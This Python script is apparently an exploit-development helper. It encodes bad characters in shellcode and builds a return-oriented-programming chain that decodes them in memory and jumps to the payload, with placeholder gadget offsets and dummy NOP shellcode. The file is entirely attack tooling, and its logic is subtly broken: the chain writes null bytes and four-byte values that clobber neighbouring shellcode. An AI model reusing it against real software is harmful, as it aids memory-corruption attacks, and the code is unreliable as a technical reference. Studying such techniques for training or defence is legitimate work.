from struct import pack

BAD_BYTE_ENCODING = {
    b'\x00': b'\xff',
    b'\x09': b'\x10',
    b'\x0a': b'\x06',
    b'\x0b': b'\x07',
    b'\x0c': b'\x08',
    b'\x0d': b'\x05',
    b'\x20': b'\x1f'
}

DECODING_MAP = {good[0]: bad[0] for good, bad in BAD_BYTE_ENCODING.items()}


def encode_shellcode(shellcode: bytes) -> bytes:
    """Replaces each bad byte in the shellcode with its corresponding good byte."""
    encoded_shellcode = bytearray(shellcode)
    for i in range(len(encoded_shellcode)):
        current_byte = bytes([encoded_shellcode[i]])
        if current_byte in BAD_BYTE_ENCODING:
            encoded_shellcode[i] = BAD_BYTE_ENCODING[current_byte][0]

    return bytes(encoded_shellcode)


def decode_shellcode(dllBase: int, bad_indices: list[int], shellcode: bytes) -> bytes:
    """ Align EAX with beginning of shellcode. Find the offset to each bad character, 
    """
    rop = b""

    # rop += pack("<L", dllBase + 0x117c)  # pop ecx ; ret (use ECX as base holder)
    # rop += pack("<L", 0x0012FF00)        # Shellcode base address (adjust as needed)
    # rop += pack("<L", dllBase + 0x1234)  # mov eax, ecx ; ret (EAX = shellcode base)

    for i in range(len(bad_indices)):
        if i == 0:
            # First bad index: offset from shellcode base
            offset = bad_indices[i]
        else:
            # Subsequent indices: offset from previous index
            offset = bad_indices[i] - bad_indices[i-1]

        neg_offset      = (-offset) & 0xffffffff  
        encoded_byte    = shellcode[bad_indices[i]]  
        decoded_byte    = DECODING_MAP[encoded_byte]  

        # Get next bad byte address in EAX
        rop += pack("<L", dllBase + 0x12345678) # pop ecx ; ret
        rop += pack("<L", neg_offset)           # Negative offset
        rop += pack("<L", dllBase + 0x23456789) # sub eax, ecx ; ret
        # Get good byte in EBX
        rop += pack("<L", dllBase + 0x3456789a) # pop ebx ; ret
        rop += pack("<L", decoded_byte)         # EBX= decoded byte
        # Overwrite bad byte with good byte
        rop += pack("<L", dllBase + 0x456789ab) # mov [eax], ebx ; ret

    # Optional: Jump to decoded shellcode (EAX points to last index, adjust if needed)
    rop += pack("<L", dllBase + 0x1238)  # jmp eax ; ret (or adjust ESP to shellcode start)

    return rop


def main():

    shellcode   = b"\x90\x90\x09\x90\x90"
    bad_indices = [i for i in range(len(shellcode)) if bytes([shellcode[i]]) in BAD_BYTE_ENCODING.keys()]
    print(f"[+] Bad bytes found at indices: {bad_indices}")

    encoded_shellcode   = encode_shellcode(shellcode)
    print(f"[+] Encoded shellcode: {encoded_shellcode}")


if __name__ == "__main__":
    main()


